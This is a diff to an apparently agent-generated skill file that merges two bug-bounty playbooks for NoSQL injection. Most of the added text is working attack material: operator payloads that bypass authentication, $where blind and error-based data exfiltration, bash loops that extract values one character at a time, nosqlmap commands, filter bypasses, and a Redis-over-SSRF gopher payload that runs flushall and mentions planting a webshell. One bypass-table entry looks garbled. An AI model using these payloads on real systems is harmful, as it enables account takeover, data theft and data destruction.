@@ -4,11 +4,11 @@ description: "Unified methodology for nosqli.. Unified from 2 upstream skills (c
 agent_created: true
 ---
 
-# Nosqli — unified methodology
+# Nosqli — unified skill
 
-> **Unified skill.** Built from 2 upstream skills across cbh, hunting. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.
+> **Complete merged skill.** Everything from 2 upstream skills across cbh, hunting is contained in this file. Unmodified originals remain in `references/` for provenance only.
 
-## Unified upstream methodology (deduplicated)
+## Unified upstream methodology (complete, deduplicated)
 
 ### Discovery and hunting method
 
@@ -21,7 +21,9 @@ agent_created: true
 - Determine which characters are actually processed by injecting them individually; confirm with a valid escaped quote (`this.category == '\''`) — if that stops erroring, syntax injection is live.
 - Operator detection in URL params uses bracket notation: `?username[$ne]=invalid&password[$ne]=invalid` — PHP's request parser and Express `qs` both turn this into nested objects.
 - GraphQL variables declared `String!` can still carry objects if the resolver forwards them without runtime type checks — test `{"username":{"$ne":null}}` regardless of the schema annotation.
-- Second-order flows: password-reset tokens, profile fields, and OTP codes that round-trip through storage before being used in a quer
+- Second-order flows: password-reset tokens, profile fields, and OTP codes that round-trip through storage before being used in a query (FantaSanremo 2026: reset `code` field with `{"$gt":""}` → mass ATO).
+- Custom headers used for identity/filtering can be operator-injection sinks: `X-User: {"$ne": null}`.
+- 2025-2026 CVE surface: Mongoose `populate()` CVE-2024-53900 and its bypass CVE-2025-23061 (`{"$or":[{"$where":"<js>"}]}`) → RCE in the Node.js process via `sift`, not the database engine.
 
 ### Signals and surfaces
 
@@ -85,7 +87,10 @@ curl -s -X POST https://$TARGET/api/login \
 - `$where` string-context breakout: `admin' || 'a'=='a`, `admin' && this.password[0]=='a' || 'a'=='b`, `admin' && this.password.match(/\d/) || 'a'=='b`.
 - Field-name discovery: `admin' && this.password!='` vs `admin' && this.foo!='` — identical responses mean the field exists. Or `"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"` with a cluster-bomb Intruder attack.
 - `$regex` char-by-char extraction without JS: `{"username":"admin","password":{"$regex":"^a"}}`; length oracle `{"password":{"$regex":"^.{8}$"}}`.
-- Error-based exfil (when app leaks DB errors): `{"$where":"this.username=='bob' && this.password=='pwd'; throw new Error(JSON.stringify(this));"}`, paginate dete
+- Error-based exfil (when app leaks DB errors): `{"$where":"this.username=='bob' && this.password=='pwd'; throw new Error(JSON.stringify(this));"}`, paginate deterministically with `if (this._id > '<last_id>') { throw ... }`.
+- Time-based blind when errors/booleans are silent: `{"$where":"var d=new Date(); do{var c=new Date();}while(c-d<5000); return true;"}` — a CPU-bound loop is more portable than `sleep()`; conditional version gates on `this.password[0]==="a"`.
+- Important 2026 reality check: server-side JS (`$where`, `$function`, `$accumulator`) is deprecated since MongoDB 8.0 and `security.javascriptEnabled` may be false — treat `$where` as a legacy avenue, not an assumption. Prefer `$regex`/boolean extraction.
+- Redis via SSRF: `gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a...` — CONFIG SET for a webshell, SLAVEOF for OOB exfil. `EVAL` running Lua is a config failure worth checking on the same pass.
 
 ### Bypass Table
 
@@ -125,7 +130,24 @@ curl -s -X POST https://$TARGET/api/login \
 - Severity: auth bypass as admin / ODM $where RCE → Critical; full collection dump → High; blind operator injection with no useful data → Medium.
 
 **Operator quick-reference table:**
-- `$ne` — not
+- `$ne` — not equal; `{"username":{"$ne":null}}` matches any non-null field → auth bypass.
+- `$gt` / `$lt` — greater/less than; `{"password":{"$gt":""}}` matches any non-empty string.
+- `$in` / `$nin` — array membership / exclusion; test several privileged usernames in one request.
+- `$exists` — field presence; `{"admin_flag":{"$exists":true}}` is a schema-probing primitive.
+- `$regex` — pattern match; `^a`, `^.{8}$`, `^p` for char-by-char and length extraction.
+- `$where` — JavaScript expression; deprecated in MongoDB 8.0, still reachable via Mongoose/sift on older stacks.
+- `$or` — used to nest a `$where` past a top-level-only filter (CVE-2025-23061 bypass).
+
+**Database-specific notes:**
+- MongoDB: operator injection is the dominant real-world class; CWE-943, OWASP A05:2025.
+- CouchDB: Mango mirrors Mongo operators; also test duplicate-`roles` key parser differentials (CVE-2017-12635 + CVE-2017-12636 → RCE).
+- Redis: newline-delimited RESP; real exposure is usually SSRF→gopher, not a web form field. EVAL/Lua is a misconfiguration.
+- Cassandra/CQL: no UNION, no subqueries, no OR, no SLEEP() — test string breakout and injected `ALLOW FILTERING --`; time-based blind is unavailable.
+- Elasticsearch: `_search` with script injection on pre-5.0 clusters; port 9200 exposure alone is not an injection finding.
+
+**Automation starting points:** NoSQLMap (`nosqlmap -u <url> --attack 1`), Burp NoSQLiScanner / Burp Intruder with an operator wordlist, OWASP ZAP with custom rules. Manual confirmation is still required for every reported finding.
+- When a header/parameter reaches a query, coercing it to a string (`.toString()`) or applying `typeof x !== 'string'` kills the object-injection primitive — check whether such guards exist before escalating severity.
+- Secondary impact worth documenting: operator injection on a read endpoint can still enable account enumeration, OTP/reset-token bypass, and cross-tenant reads even when no admin login is returned.
 
 ### Validation
 
@@ -151,16 +173,136 @@ curl -s -X POST https://$TARGET/api/login \
 
 ---
 
+### Sources and related reading
+
+### D. Sources — numbered list of URLs you actually fetched
+
+1. https://portswigger.net/web-security/nosql-injection
+2. https://www.invicti.com/blog/web-security/nosql-injection-cheat-sheet
+
+### Additional notes
+
+### URL & Param Patterns
+
+```
+/api/users/login         POST with JSON body
+/api/search?q=
+/api/find?filter=
+/api/query?where=
+Any endpoint accepting JSON body with username/password
+```
+
+### Phase 2 — URL Parameter Injection
+
+```bash
+# Array notation (Express/PHP-style)
+curl "https://$TARGET/api/users?username[$gt]=&password[$gt]="
+curl "https://$TARGET/api/search?q[$regex]=.*&q[$options]=i"
+
+# POST form data
+curl "https://$TARGET/api/login" \
+  --data "username[$gt]=&password[$gt]="
+```
+
+### Phase 3 — $where Blind Injection (time-based)
+
+```bash
+# Test if $where is enabled (time-based detection, 5s delay)
+curl -s -X POST https://$TARGET/api/search \
+  -H "Content-Type: application/json" \
+  -d '{"q": {"$where": "function(){var d=new Date();while(new Date()-d<5000){}; return true;}"}}'
+# If response takes 5+ seconds → $where injection confirmed
+
+# Blind data exfil (username starts with 'a'?)
+curl -s -X POST https://$TARGET/api/search \
+  -H "Content-Type: application/json" \
+  -d '{"q": {"$where": "function(){if(this.username.match(/^a/)){sleep(3000);} return true;}"}}'
+```
+
+### Phase 3b — Syntax injection into a concatenated `$where`/query (string context)
+
+When the app concatenates input into a JS `$where` STRING (`"this.name=='"+input+"'"`) instead of accepting an operator object, break the string rather than passing `$gt`/`$ne`. Fuzz first, then break:
+```
+fuzz:  ' " ` { ; $         # any 500/behaviour change = syntax reaches the query
+' || '1'=='1               # always-true (string-context breakout)
+' && this.password.match(/^a/) || 'x'=='y   # boolean char-exfil oracle
+```
+(PortSwigger: Injecting syntax into NoSQL queries.)
+
+### Phase 4 — Data Dump via Regex
+
+```bash
+# Enumerate usernames character by character
+for c in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
+  RESP=$(curl -s -X POST https://$TARGET/api/users \
+    -H "Content-Type: application/json" \
+    -d "{\"username\": {\"\$regex\": \"^$c\"}}")
+  echo "$c: $(echo $RESP | wc -c)"
+done
+```
+
+### Phase 5 — Automation
+
+```bash
+# nosqlmap
+pip3 install nosqlmap
+nosqlmap -u "https://$TARGET/api/login" --attack 1
+
+# nosqlmap data extraction
+nosqlmap -u "https://$TARGET/api/login" --attack 2
+```
+
+### Phase 6 — Redis via SSRF
+
+```bash
+# If SSRF found, probe internal Redis via gopher://
+curl "https://$TARGET/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a"
+
+# CONFIG SET webshell (if Redis has write access to web root)
+# Use SLAVEOF for OOB data exfil
+```
+
+---
+
+## Companion methodology (complete, deduplicated)
+
+Full text of every non-SKILL.md methodology document from the contributing skills.
+
+### Companion: hunting / references/techniques.md
+
+# HUNT-NOSQLI — NoSQL Injection — Technique reference
+
+Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.
+
+---
+
+## Bypass Table
+
+
+
+| Defense | Bypass |
+
+|---------|--------|
+
+| JSON.parse rejects objects | Use array: `password[$ne]=x` (URL params) |
+
+| Sanitizes `$` | Unicode: `$gt` |
+
+| Blocks operator keys | Nested objects deeper in structure |
+
+
+
+---
+
 ## Source skills merged into this topic
 
 - `hunting` — `nosqli`
 - `cbh` — `hunt-nosqli`
 
-## References
+## Provenance
 
-- `references/unified-method.md` — complete deduplicated union of all upstream sections
-- `references/upstream-*.md` — full original SKILL.md from each contributing repo
-- `references/upstream-assets/` — 1 companion files (payload/technique references, scripts, validators and schemas) from the contributing skills
-- `references/unified-method.md` — includes 1 merged companion methodology documents
+- `references/unified-method.md` — same deduplicated union as this file, for tooling
+- `references/upstream-*.md` — unmodified original SKILL.md from each repo
+- `references/upstream-assets/` — 1 companion files
 - `../../upstream/` — complete unmodified archives of all five source repositories
 - `bbhunt-methodology` — orchestrator, state machine and class router
